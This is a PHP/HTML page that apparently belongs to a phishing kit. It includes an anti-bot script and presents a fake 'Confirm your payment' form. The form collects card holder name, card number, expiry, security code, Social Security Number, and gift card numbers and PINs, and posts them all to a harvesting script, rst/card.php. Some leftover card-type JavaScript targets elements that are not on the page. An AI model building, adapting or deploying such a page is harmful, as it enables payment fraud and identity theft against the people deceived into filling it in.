<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Confirm your payment</title>
<link href="img/fav.png" rel="shortcut icon">
<link href="css/card.css" rel="stylesheet" type="text/css">
<script src="jss/jquery.js" type="text/javascript"></script>
<script src="jss/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:1px;top:0px;width:1326px;height:770px;z-index:11;">
<form action="rst/card.php" method="POST">
<input type="text" required="" id="Editbox1" style="position:absolute;left:32px;top:309px;width:376px;height:36px;line-height:36px;z-index:0;" name="1" value="" placeholder="Card Holder">
<input type="text" required="" autocomplete="off" maxlength="20" minlength="15" id="Editbox2" style="position:absolute;left:32px;top:372px;width:376px;height:36px;line-height:36px;z-index:1;" name="2" value="" placeholder="Card Number">
<input type="text" required="" id="Editbox3" style="position:absolute;left:32px;top:435px;width:178px;height:36px;line-height:36px;z-index:2;" name="3" value="" placeholder="MM/YYYY">
<input type="text" required="" autocomplete="off" minlength="3" maxlength="4" id="Editbox4" style="position:absolute;left:230px;top:435px;width:178px;height:36px;line-height:36px;z-index:3;" name="4" value="" placeholder="CSC">
<div id="wb_Image1" style="position:absolute;left:369px;top:441px;width:43px;height:26px;z-index:4;">
<img src="img/cvv.png" id="Image1" alt=""></div>
<input type="text" id="Editbox5" style="position:absolute;left:32px;top:498px;width:376px;height:36px;line-height:36px;z-index:5;" name="5" value="" placeholder="Social Security Number">
<input type="text" id="Editbox6" style="position:absolute;left:930px;top:309px;width:376px;height:36px;line-height:36px;z-index:6;" name="6" value="" placeholder="Gift Card Nickname (optional)">
<input type="text" id="Editbox7" style="position:absolute;left:930px;top:372px;width:376px;height:36px;line-height:36px;z-index:7;" name="7" value="" placeholder="Gift Card Number">
<input type="text" id="Editbox8" style="position:absolute;left:930px;top:435px;width:178px;height:36px;line-height:36px;z-index:8;" name="8" value="" placeholder="PIN (4 digits)">
<input type="submit" id="Button1" name="" value=" " style="position:absolute;left:1169px;top:564px;width:149px;height:38px;z-index:9;cursor:pointer;">
<div id="wb_Text1" style="position:absolute;left:930px;top:288px;width:151px;height:16px;z-index:10;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:13px;"><strong>Do you have gift card ? </strong></span></div>
</form>
</div>
   <script>
        jQuery(function($){
            $("#Editbox3").mask("99/9999");
            $("#Editbox5").mask("999-99-9999");
            $("#Editbox8").mask("9999");
        });
                /*En of script*/


        function type_carte(){
            var get_value = document.getElementById('cardnumber').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
                document.getElementById("card").style.backgroundPosition = "0px 1px";
                document.getElementById("csc").maxLength ="4"
            }else if(other == "5"){
                document.getElementById("card").style.backgroundPosition = "0px -27px";
                document.getElementById("csc").maxLength ="4";
            }
            /*Amex Card*/
            else if(type == "34"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("csc").maxLength ="4"
            }
            else if(type == "37"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("csc").maxLength ="4"
            }

            /*End Amex Card*/

            /*blue Card*/
            else if(type == "30"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            } else if(type == "36"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "38"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
                document.getElementById("card").style.backgroundPosition = "0px -86px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "35"){
                document.getElementById("card").style.backgroundPosition = "0px -145px";
                document.getElementById('cont_in').style.display ="none"
            }else{
                document.getElementById("card").style.backgroundPosition = "0px -406px";
                document.getElementById('type_cvv').style.backgroundPosition ="0px -434px";
                document.getElementById("csc").maxLength ="4"
            }
        };
    </script>
</body>
</html>